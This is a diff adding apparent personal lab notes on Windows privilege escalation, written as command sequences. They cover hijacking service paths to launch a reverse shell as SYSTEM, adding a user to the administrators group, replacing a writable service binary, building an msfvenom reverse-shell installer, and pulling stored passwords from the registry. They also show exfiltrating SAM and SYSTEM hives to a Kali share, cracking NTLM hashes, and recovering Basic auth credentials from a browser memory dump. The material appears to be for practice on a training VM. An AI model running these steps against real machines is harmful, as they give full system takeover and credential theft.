@@ -1,0 +1,167 @@
+cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ to check the resent command history in pwoershell
+
+Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).
+
+sc qc regsvc
+
+Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):
+
+C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+
+Overwrite the ImagePath registry key to point to the reverse.exe executable you created:
+
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+
+Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+
+net start regsvc
+
+
+==============================================================================================================================
+
+
+
+Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:
+
+C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
+
+Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).
+
+Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):
+
+sc qc daclsvc
+
+Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:
+
+sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+
+Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+
+net start daclsvc
+
+#another daclsvc exploit
+-------------------------
+
+1. In command prompt type: sc config daclsvc binpath= "net localgroup administrators user /add"
+2. In command prompt type: sc start daclsvc
+3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
+
+
+=====================================================================================================================================
+
+
+
+Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).
+
+sc qc filepermsvc
+
+Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:
+
+C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+
+Copy the reverse.exe executable you created and replace the filepermservice.exe with it:
+
+copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+
+Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+
+net start filepermsvc
+
+
+=========================================================================================================
+
+Query the registry for AlwaysInstallElevated keys:
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+Note that both keys are set to 1 (0x1).
+
+On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
+
+Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).
+
+Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:
+
+msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+========================================================================================
+For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: password123)
+
+The registry can be searched for keys and values that contain the word "password":
+
+reg query HKLM /f password /t REG_SZ /s
+
+If you want to save some time, query this specific key to find admin AutoLogon credentials:
+
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
+
+winexe -U 'admin%password' //10.10.29.15 cmd.exe
+================================================================================================================
+
+
+Start an RDP session as the "user" account:
+
+rdesktop -u user -p password321 10.10.29.15
+
+Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:
+
+tasklist /V | findstr mspaint.exe
+
+In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe
+
+Press Enter to spawn a command prompt running with admin privileges.
+=======================================================================================================
+
+The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.
+
+Transfer the SAM and SYSTEM files to your Kali VM:
+
+copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
+copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
+
+On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:
+
+git clone https://github.com/Tib3rius/creddump7
+pip3 install pycrypto
+python3 creddump7/pwdump.py SYSTEM SAM
+
+Crack the admin NTLM hash using hashcat:
+
+hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+
+You can use the cracked password to log in as the admin using winexe or RDP.
+
+===========================================================================================================================
+Exploitation
+
+Kali VM
+
+1.Open command prompt and type: msfconsole
+2.In Metasploit (msf > prompt) type: use auxiliary/server/capture/http_basic
+3.In Metasploit (msf > prompt) type: set uripath x
+4.In Metasploit (msf > prompt) type: run
+
+Windows VM
+
+1.Open Internet Explorer and browse to: http://[Kali VM IP Address]/x
+2.Open command prompt and type: taskmgr
+3.In Windows Task Manager, right-click on the “iexplore.exe” in the “Image Name” columnand select “Create Dump File” from the popup menu.
+4.Copy the generated file, iexplore.DMP, to the Kali VM.
+
+Kali VM
+
+1.Place ‘iexplore.DMP’ on the desktop.
+2.Open command prompt and type: strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
+3.Select the Copy the Base64 encoded string.
+4.In command prompt type: echo -ne [Base64 String] | base64 -d
+5.Notice the credentials in the output.
+
+
+
+
+
